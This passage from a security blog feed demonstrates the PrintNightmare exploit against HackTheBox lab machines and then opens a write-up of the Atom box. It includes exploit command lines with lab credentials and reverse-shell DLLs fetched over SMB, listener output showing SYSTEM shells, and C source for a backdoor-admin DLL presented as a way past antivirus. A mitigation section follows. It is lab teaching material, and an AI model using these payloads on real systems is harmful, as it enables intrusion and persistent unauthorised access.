</span></span><span class="line"><span class="cl">Protocol: <span class="o">[</span>MS-PAR<span class="o">]</span>: Print System Asynchronous Remote Protocol 
</span></span><span class="line"><span class="cl">Protocol: <span class="o">[</span>MS-RPRN<span class="o">]</span>: Print System Remote Protocol 
</span></span><span class="line"><span class="cl">No printers returned.
</span></span><span class="line"><span class="cl"> - <span class="o">[</span>10.10.10.149<span class="o">]</span> - 
</span></span><span class="line"><span class="cl">Protocol: <span class="o">[</span>MS-PAR<span class="o">]</span>: Print System Asynchronous Remote Protocol 
</span></span><span class="line"><span class="cl">Protocol: <span class="o">[</span>MS-RPRN<span class="o">]</span>: Print System Remote Protocol 
</span></span><span class="line"><span class="cl">No printers returned.
</span></span><span class="line"><span class="cl"> - <span class="o">[</span>10.10.10.161<span class="o">]</span> - 
</span></span><span class="line"><span class="cl">Could not initialise spoolss. Error was NT_STATUS_OBJECT_NAME_NOT_FOUND
</span></span><span class="line"><span class="cl"> - <span class="o">[</span>10.10.10.237<span class="o">]</span> - 
</span></span><span class="line"><span class="cl">Protocol: <span class="o">[</span>MS-PAR<span class="o">]</span>: Print System Asynchronous Remote Protocol 
</span></span><span class="line"><span class="cl">Protocol: <span class="o">[</span>MS-RPRN<span class="o">]</span>: Print System Remote Protocol 
</span></span><span class="line"><span class="cl">No printers returned.
</span></span></code></pre></div><p>Based on the results above, Active and Forest don&rsquo;t seem to be vulnerable, but I will still test them out!</p>
<h2 id="exploitation-demo">Exploitation Demo</h2>
<h3 id="101010100-active">[10.10.10.100] Active</h3>
<p>As expected, on Active the exploit is failed.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="o">(</span>impacket-venv<span class="o">)</span> → kali@kali «CVE-2021-1675-cube0x0» «10.10.14.75» git:<span class="o">(</span>main<span class="o">)</span> 
</span></span><span class="line"><span class="cl">$ python3 CVE-2021-1675.py active.htb/SVC_TGS:<span class="s1">&#39;GPPstillStandingStrong2k18&#39;</span>@10.10.10.100 <span class="s1">&#39;\\10.10.14.75\ef\revshell.dll&#39;</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Connecting to ncacn_np:10.10.10.100<span class="o">[</span><span class="se">\P</span>IPE<span class="se">\s</span>poolss<span class="o">]</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> Connection Failed
</span></span></code></pre></div><h3 id="101010134-bastion">[10.10.10.134] Bastion</h3>
<p>I ran the exploit against Bastion, and it connected but then the DLL got removed by AV 😂. I will re-exploit this in the <a href="#av-evasion">Troubleshoot</a> section</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="o">(</span>impacket-venv<span class="o">)</span> → kali@kali «CVE-2021-1675-cube0x0» «10.10.14.75» git:<span class="o">(</span>main<span class="o">)</span> 
</span></span><span class="line"><span class="cl">$ python3 CVE-2021-1675.py Bastion/l4mpje:<span class="s1">&#39;bureaulampje&#39;</span>@10.10.10.134 <span class="s1">&#39;\\10.10.14.75\ef\revshell.dll&#39;</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Connecting to ncacn_np:10.10.10.134<span class="o">[</span><span class="se">\P</span>IPE<span class="se">\s</span>poolss<span class="o">]</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Bind OK
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> pDriverPath Found C:<span class="se">\W</span>indows<span class="se">\S</span>ystem32<span class="se">\D</span>riverStore<span class="se">\F</span>ileRepository<span class="se">\n</span>tprint.inf_amd64_1734185bdb8f8610<span class="se">\A</span>md64<span class="se">\U</span>NIDRV.DLL
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Executing <span class="se">\?</span>?<span class="se">\U</span>NC<span class="se">\1</span>0.10.14.75<span class="se">\e</span>f<span class="se">\r</span>evshell.dll
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Try 1...
</span></span><span class="line"><span class="cl">Traceback <span class="o">(</span>most recent call last<span class="o">)</span>:
</span></span><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span><span class="line"><span class="cl">impacket.dcerpc.v5.rprn.DCERPCSessionError: RPRN SessionError: code: 0xe1 - ERROR_VIRUS_INFECTED - Operation did not <span class="nb">complete</span> successfully because the file contains a virus or potentially unwanted software
</span></span></code></pre></div><h3 id="101010134-heist">[10.10.10.134] Heist</h3>
<p>On Heist, the exploit didn&rsquo;t show any indication of a successful exploitation (I will look into this problem at <a href="#troubleshoot">Troubleshoot</a>).</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="o">(</span>impacket-venv<span class="o">)</span> → kali@kali «CVE-2021-1675-cube0x0» «10.10.14.75» git:<span class="o">(</span>main<span class="o">)</span> 
</span></span><span class="line"><span class="cl">$ python3 CVE-2021-1675.py heist/hazard:<span class="s1">&#39;stealth1agent&#39;</span>@10.10.10.149 <span class="s1">&#39;\\10.10.14.75\ef\revshell.dll&#39;</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Connecting to ncacn_np:10.10.10.149<span class="o">[</span><span class="se">\P</span>IPE<span class="se">\s</span>poolss<span class="o">]</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Bind OK
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> pDriverPath Found C:<span class="se">\W</span>indows<span class="se">\S</span>ystem32<span class="se">\D</span>riverStore<span class="se">\F</span>ileRepository<span class="se">\n</span>tprint.inf_amd64_83aa9aebf5dffc96<span class="se">\A</span>md64<span class="se">\U</span>NIDRV.DLL
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Executing <span class="se">\?</span>?<span class="se">\U</span>NC<span class="se">\1</span>0.10.14.75<span class="se">\e</span>f<span class="se">\r</span>evshell.dll
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Try 1...
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Stage0: <span class="m">0</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Try 2...
</span></span><span class="line"><span class="cl">Traceback <span class="o">(</span>most recent call last<span class="o">)</span>:
</span></span><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span><span class="line"><span class="cl">impacket.smb3.SessionError: SMB SessionError: STATUS_PIPE_CLOSING<span class="o">(</span>The specified named pipe is in the closing state.<span class="o">)</span>
</span></span></code></pre></div><p>But strangely, I got a shell on my listener.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «printnightmare» «10.10.14.75» 
</span></span><span class="line"><span class="cl">$ nc -nvlp <span class="m">4444</span>
</span></span><span class="line"><span class="cl">listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">4444</span> ...
</span></span><span class="line"><span class="cl">connect to <span class="o">[</span>10.10.14.75<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.149<span class="o">]</span> <span class="m">49700</span>
</span></span><span class="line"><span class="cl">Microsoft Windows <span class="o">[</span>Version 10.0.17763.437<span class="o">]</span>
</span></span><span class="line"><span class="cl"><span class="o">(</span>c<span class="o">)</span> <span class="m">2018</span> Microsoft Corporation. All rights reserved.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;whoami
</span></span><span class="line"><span class="cl">whoami
</span></span><span class="line"><span class="cl">nt authority<span class="se">\s</span>ystem
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;hostname
</span></span><span class="line"><span class="cl">hostname
</span></span><span class="line"><span class="cl">SupportDesk
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;ipconfig
</span></span><span class="line"><span class="cl">ipconfig
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Windows IP Configuration
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Ethernet adapter Ethernet0 2:
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">   Connection-specific DNS Suffix  . : 
</span></span><span class="line"><span class="cl">   IPv6 Address. . . . . . . . . . . : dead:beef::c138:bcba:454d:8b9c
</span></span><span class="line"><span class="cl">   Link-local IPv6 Address . . . . . : fe80::c138:bcba:454d:8b9c%15
</span></span><span class="line"><span class="cl">   IPv4 Address. . . . . . . . . . . : 10.10.10.149
</span></span><span class="line"><span class="cl">   Subnet Mask . . . . . . . . . . . : 255.255.255.0
</span></span><span class="line"><span class="cl">   Default Gateway . . . . . . . . . : fe80::250:56ff:feb9:271c%15
</span></span><span class="line"><span class="cl">                                       10.10.10.2
</span></span></code></pre></div><h3 id="101010161-forest">[10.10.10.161] Forest</h3>
<p>Like on Active, the exploit also failed on Forest</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="o">(</span>impacket-venv<span class="o">)</span> → kali@kali «CVE-2021-1675-cube0x0» «10.10.14.75» git:<span class="o">(</span>main<span class="o">)</span> 
</span></span><span class="line"><span class="cl">$ python3 CVE-2021-1675.py htb.local/svc-alfresco:<span class="s1">&#39;s3rvice&#39;</span>@10.10.10.161 <span class="s1">&#39;\\10.10.14.75\ef\revshell.dll&#39;</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Connecting to ncacn_np:10.10.10.161<span class="o">[</span><span class="se">\P</span>IPE<span class="se">\s</span>poolss<span class="o">]</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> Connection Failed
</span></span></code></pre></div><h3 id="101010237-atom">[10.10.10.237] Atom</h3>
<p>On Atom, the exploit returned the same result as on Heist, no indication of a successful exploitation.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="o">(</span>impacket-venv<span class="o">)</span> → kali@kali «CVE-2021-1675-cube0x0» «10.10.14.75» git:<span class="o">(</span>main<span class="o">)</span> 
</span></span><span class="line"><span class="cl">$ python3 CVE-2021-1675.py ATOM/jason:<span class="s1">&#39;kidvscat_electron_@123&#39;</span>@10.10.10.237 <span class="s1">&#39;\\10.10.14.75\ef\revshell.dll&#39;</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Connecting to ncacn_np:10.10.10.237<span class="o">[</span><span class="se">\P</span>IPE<span class="se">\s</span>poolss<span class="o">]</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Bind OK
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> pDriverPath Found C:<span class="se">\W</span>INDOWS<span class="se">\S</span>ystem32<span class="se">\D</span>riverStore<span class="se">\F</span>ileRepository<span class="se">\n</span>tprint.inf_amd64_c62e9f8067f98247<span class="se">\A</span>md64<span class="se">\U</span>NIDRV.DLL
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Executing <span class="se">\?</span>?<span class="se">\U</span>NC<span class="se">\1</span>0.10.14.75<span class="se">\e</span>f<span class="se">\r</span>evshell.dll
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Try 1...
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Stage0: <span class="m">0</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Try 2...
</span></span><span class="line"><span class="cl">Traceback <span class="o">(</span>most recent call last<span class="o">)</span>:
</span></span><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span><span class="line"><span class="cl">impacket.smbconnection.SessionError: SMB SessionError: STATUS_PIPE_CLOSING<span class="o">(</span>The specified named pipe is in the closing state.<span class="o">)</span>
</span></span></code></pre></div><p>But then the DLL connected to my listener.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «printnightmare» «10.10.14.75» 
</span></span><span class="line"><span class="cl">$ nc -nvlp <span class="m">4444</span>
</span></span><span class="line"><span class="cl">listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">4444</span> ...
</span></span><span class="line"><span class="cl">connect to <span class="o">[</span>10.10.14.75<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.237<span class="o">]</span> <span class="m">62322</span>
</span></span><span class="line"><span class="cl">Microsoft Windows <span class="o">[</span>Version 10.0.19042.906<span class="o">]</span>
</span></span><span class="line"><span class="cl"><span class="o">(</span>c<span class="o">)</span> Microsoft Corporation. All rights reserved.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">C:<span class="se">\W</span>INDOWS<span class="se">\s</span>ystem32&gt;whoami
</span></span><span class="line"><span class="cl">whoami
</span></span><span class="line"><span class="cl">nt authority<span class="se">\s</span>ystem
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">C:<span class="se">\W</span>INDOWS<span class="se">\s</span>ystem32&gt;hostname
</span></span><span class="line"><span class="cl">hostname
</span></span><span class="line"><span class="cl">ATOM
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">C:<span class="se">\W</span>INDOWS<span class="se">\s</span>ystem32&gt;ipconfig
</span></span><span class="line"><span class="cl">ipconfig
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Windows IP Configuration
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Ethernet adapter Ethernet0:
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">   Connection-specific DNS Suffix  . : 
</span></span><span class="line"><span class="cl">   IPv6 Address. . . . . . . . . . . : dead:beef::6036:234d:b46e:b7d
</span></span><span class="line"><span class="cl">   Temporary IPv6 Address. . . . . . : dead:beef::6193:2da2:279d:6fea
</span></span><span class="line"><span class="cl">   Temporary IPv6 Address. . . . . . : dead:beef::94cf:8412:6dc6:a8ed
</span></span><span class="line"><span class="cl">   Link-local IPv6 Address . . . . . : fe80::6036:234d:b46e:b7d%6
</span></span><span class="line"><span class="cl">   IPv4 Address. . . . . . . . . . . : 10.10.10.237
</span></span><span class="line"><span class="cl">   Subnet Mask . . . . . . . . . . . : 255.255.255.0
</span></span><span class="line"><span class="cl">   Default Gateway . . . . . . . . . : fe80::250:56ff:feb9:271c%6
</span></span><span class="line"><span class="cl">                                       10.10.10.2
</span></span></code></pre></div><h2 id="troubleshoot">Troubleshoot</h2>
<h4 id="status_pipe_closing">STATUS_PIPE_CLOSING</h4>
<p>I&rsquo;m sure that the following error is caused by my DLL payload.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">impacket.smb3.SessionError: SMB SessionError: STATUS_PIPE_CLOSING(The specified named pipe is in the closing state.)
</span></span></code></pre></div><p>This is probably because, instead of using the DLL to create a user (one time load / execution / thread / I don&rsquo;t know~), I use the DLL for reverse shell.</p>
<p><del>I wanted to generate my own payload to test but my Visual Studio somehow didn&rsquo;t want me to install the Windows SDK</del>  (Fixed on <a href="https://fahmifj.github.io/blog/me-vs-windows-permissions/">this post</a>).</p>
<p>Because I don&rsquo;t want to RE the DLL created with msfvenom, I steal <a href="https://github.com/fahmifj/PrintNightmare-kit/blob/main/generate-nightmaredll.ps1">this payload</a> from this <a href="https://github.com/calebstewart/CVE-2021-1675">PoC</a> created by Caleb Stewart and John Hammond.</p>
<script type="application/javascript" src="https://gist.github.com/fahmifj/f3f3166eba91e97aed7c16c88e1f76c0.js"></script>

<p>I can simply invoke <code>Get-NightmareDLL</code> within a PowerShell session to generate the DLL.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">PS /opt/PrintNightmare/dll&gt; Import-Module ./generate-nightmaredll.ps1
</span></span><span class="line"><span class="cl">PS /opt/PrintNightmare/dll&gt; Get-NightmareDLL
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Created payload at /opt/printnightmare/dll/nightmare.dll
</span></span></code></pre></div><p>I ran the exploit again on Atom, but this time it didn&rsquo;t crash, instead it showed the indication of a successful exploitation.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="o">(</span>impacket-venv<span class="o">)</span> → kali@kali «CVE-2021-1675-cube0x0» «10.10.14.75» git:<span class="o">(</span>main<span class="o">)</span> ✗ 
</span></span><span class="line"><span class="cl">$ python3 CVE-2021-1675.py ATOM/jason:<span class="s1">&#39;kidvscat_electron_@123&#39;</span>@10.10.10.237 <span class="s1">&#39;\\10.10.14.75\ef\nightmare.dll&#39;</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Connecting to ncacn_np:10.10.10.237<span class="o">[</span><span class="se">\P</span>IPE<span class="se">\s</span>poolss<span class="o">]</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Bind OK
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> pDriverPath Found C:<span class="se">\W</span>INDOWS<span class="se">\S</span>ystem32<span class="se">\D</span>riverStore<span class="se">\F</span>ileRepository<span class="se">\n</span>tprint.inf_amd64_c62e9f8067f98247<span class="se">\A</span>md64<span class="se">\U</span>NIDRV.DLL
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Executing <span class="se">\?</span>?<span class="se">\U</span>NC<span class="se">\1</span>0.10.14.75<span class="se">\e</span>f<span class="se">\n</span>ightmare.dll
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Try 1...
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Stage0: <span class="m">0</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Try 2...
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Stage0: <span class="m">0</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Stage2: <span class="m">0</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Exploit Completed
</span></span></code></pre></div><p>Now I can login with credentials of  <code>adm1n:P@ssw0rd</code> (default credentials from the stolen DLL) using <code>evil-winrm</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «dll» «10.10.14.75» 
</span></span><span class="line"><span class="cl">$ evil-winrm -i 10.10.10.237 -u <span class="s1">&#39;adm1n&#39;</span> -p <span class="s1">&#39;P@ssw0rd&#39;</span>                                                       
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Evil-WinRM shell v2.4
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Info: Establishing connection to remote endpoint
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\a</span>dm1n<span class="se">\D</span>ocuments&gt; whoami /groups <span class="p">|</span> <span class="k">select</span>-string <span class="s2">&#34;Administrators&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">NT AUTHORITY<span class="se">\L</span>ocal account and member of Administrators group Well-known group S-1-5-114    Mandatory group, Enabled by default, Enabled group
</span></span><span class="line"><span class="cl">BUILTIN<span class="se">\A</span>dministrators                                        Alias            S-1-5-32-544 Mandatory group, Enabled by default, Enabled group, Group owner
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\a</span>dm1n<span class="se">\D</span>ocuments&gt; hostname
</span></span><span class="line"><span class="cl">ATOM
</span></span></code></pre></div><h4 id="av-evasion">AV Evasion</h4>
<p>Another issue I ran into during the demo was that the payload got removed by Microsoft Defender on Bastion. Using a self compile DLL payload from <a href="https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/dll-hijacking#your-own">BookHackTrick</a> DLL templates can resolve this  (I should do this earlier 😅🔨).</p>
<p>The following is the template that I use.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="c1">// stolen from https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/dll-hijacking#your-own
</span></span></span><span class="line"><span class="cl"><span class="c1">// compile: x86_64-w64-mingw32-gcc add_user_1.c -shared -o add_user.dll
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="cp">#include</span><span class="cpf">&lt;windows.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span><span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span><span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">Entry</span> <span class="p">(){</span> <span class="c1">//Default function that is executed when the DLL is loaded
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">system</span><span class="p">(</span><span class="s">&#34;cmd.exe /c net user iamf &lt;password&gt; /add&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">system</span><span class="p">(</span><span class="s">&#34;cmd.exe /c net localgroup administrators iamf /add&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">BOOL</span> <span class="n">APIENTRY</span> <span class="nf">DllMain</span> <span class="p">(</span><span class="n">HMODULE</span> <span class="n">hModule</span><span class="p">,</span> <span class="n">DWORD</span> <span class="n">ul_reason_for_call</span><span class="p">,</span> <span class="n">LPVOID</span> <span class="n">lpReserved</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">switch</span> <span class="p">(</span><span class="n">ul_reason_for_call</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="k">case</span> <span class="nl">DLL_PROCESS_ATTACH</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">CreateThread</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span> <span class="p">(</span><span class="n">LPTHREAD_START_ROUTINE</span><span class="p">)</span><span class="n">Entry</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">case</span> <span class="nl">DLL_THREAD_ATTACH</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">case</span> <span class="nl">DLL_THREAD_DETACH</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">case</span> <span class="nl">DLL_PROCESS_DETACH</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">TRUE</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>The code can be compiled from Linux using <code>mingw-w64</code> compiler (<code>sudo apt install mingw-w64</code>). I will run the following command to compile the DLL.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ x86_64-w64-mingw32-gcc add_user_1.c -shared -o add_user.dll
</span></span></code></pre></div><p>On Bastion, although the exploit successfully evade the AV and the backdoor user was added into the machine, I&rsquo;m unable to login via WinRM. However,  <code>impacket-psexec</code> will do.</p>
<p><div class="img-container"><img src="imgs/image-20210730191657750.png" alt="image-20210730191657750"  /></div>
</p>
<p>Further investigation, I found out that  <code>Invoke-Command</code> from localhost is allowed.</p>
<p><div class="img-container"><img src="imgs/image-20210730192152601.png" alt="image-20210730192152601"  /></div>
</p>
<p>So, I guess the WinRM on Bastion was configured to only allow admin account for remote access. I couldn&rsquo;t get the &ldquo;right&rdquo; keywords to <em>google</em> this. Below are what I&rsquo;ve tried so far:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ winrm get winrm/config
</span></span><span class="line"><span class="cl">$ winrm get winrm/config/listener
</span></span><span class="line"><span class="cl">$ <span class="o">(</span>Get-PSSessionConfiguration -Name Microsoft.PowerShell<span class="o">)</span>.Permission
</span></span><span class="line"><span class="cl">$ HKLM<span class="se">\S</span>OFTWARE<span class="se">\M</span>icrosoft<span class="se">\W</span>indows<span class="se">\C</span>urrentVersion<span class="se">\P</span>olicies<span class="se">\S</span>ystem
</span></span><span class="line"><span class="cl">$ reg add HKLM<span class="se">\S</span>OFTWARE<span class="se">\M</span>icrosoft<span class="se">\W</span>indows<span class="se">\C</span>urrentVersion<span class="se">\P</span>olicies<span class="se">\S</span>ystem /v LocalAccountTokenFilterPolicy /t REG_DWORD /d <span class="m">1</span> /f
</span></span></code></pre></div><h2 id="mitigation">Mitigation</h2>
<p>Microsoft provided <a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527">two options</a> as workarounds to mitigate PrintNightmare:</p>
<ul>
<li>Disable Print Spooler service</li>
<li>Disable inbound remote printing through Group Policy.</li>
</ul>
<p>Also, it is recommended to install <a href="https://support.microsoft.com/topic/31b91c02-05bc-4ada-a7ea-183b129578a7">KB5005010</a> patch.  I have no idea to work with the second option from CLI, so I will demo the first one.</p>
<h4 id="disable-print-spooler-service">Disable Print Spooler Service</h4>
<p>Based on Microsoft guidance, I need to determine if the Print Spooler Service is running by using  <code>Get-Service -Name Spooler</code> in PowerShell. If the service is running, stop and disable it by running the following commands in PowerShell consecutively.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ Stop-Service -Name Spooler -Force
</span></span><span class="line"><span class="cl">$ Set-Service -Name Spooler -StartupType Disabled
</span></span></code></pre></div><p>I will run that on Bastion.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\&gt;</span> Get-Service -Name Spooler 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Status   Name               DisplayName
</span></span><span class="line"><span class="cl">------   ----               -----------
</span></span><span class="line"><span class="cl">Running  Spooler            Print Spooler
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\&gt;</span> Stop-Service -Name Spooler -Force
</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\&gt;</span> Set-Service -Name Spooler -StartupType Disabled
</span></span></code></pre></div><p>After disabling Spooler service, I ran the exploit again, but this time, it returned a &ldquo;Connection Failed&rdquo; message.</p>
<p><div class="img-container"><img src="imgs/image-20210717133929589.png" alt="image-20210717133929589"  /></div>
</p>
<p>The workaround is worked! But, the downside is that you loss the ability to print from both local and remote 🙃.</p>
<p>For more detailed mitigation, you can go to <a href="https://github.com/LaresLLC/CVE-2021-1675">this GitHub repo</a>.</p>
]]></content:encoded>
    </item>
    
    <item>
      <title>HackTheBox - Atom</title>
      <link>https://fahmifj.github.io/hackthebox/atom/</link>
      <pubDate>Sat, 10 Jul 2021 20:28:32 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/hackthebox/atom/</guid>
      <description>Supplying a malicious update definition to Electron-updater</description>
      <content:encoded><![CDATA[<p>Atom brings a cool exploitation of a vulnerability in the auto-update feature of Electron-Builder. In Atom, there is a writable SMB share which is used by a company to store an update definition file for QA testing. With write access, a malicious update definition can be placed on the share. This malicious update definition points to my reverse shell binary, which results in gaining an interactive shell to the system. Internal enumeration of the system finds a password which can be used to authenticate to a Redis server. I&rsquo;m able to obtain administrator credentials by dumping the Redis database.</p>
<h4 id="skills-learned">Skills Learned</h4>
<ul>
<li>Exploitation of Electron-Builder app through auto-update.</li>
<li>Redis enumeration</li>
</ul>
<h4 id="tools">Tools</h4>
<ul>
<li>Nmap</li>
<li>CrackMapExec</li>
<li>Msfvenom</li>
<li>Netcat</li>
<li>Impacket</li>
</ul>
<h2 id="reconnaissance">Reconnaissance</h2>
<h3 id="nmap">Nmap</h3>
<p>A full TCP scan with <code>nmap</code> discovers six open ports: HTTP on 80 and its secure version on 443, MSRPC on 135, SMB on 445, WinRM on 5985 and Redis on 6379.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «atom» «10.10.14.49» 
</span></span><span class="line"><span class="cl">$ nmap -p- --max-rate <span class="m">1000</span> -sV --reason -oA nmap/10-tcp-allport-atom 10.10.10.237
</span></span><span class="line"><span class="cl">Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-05-17 07:56 EDT
</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.10.10.237
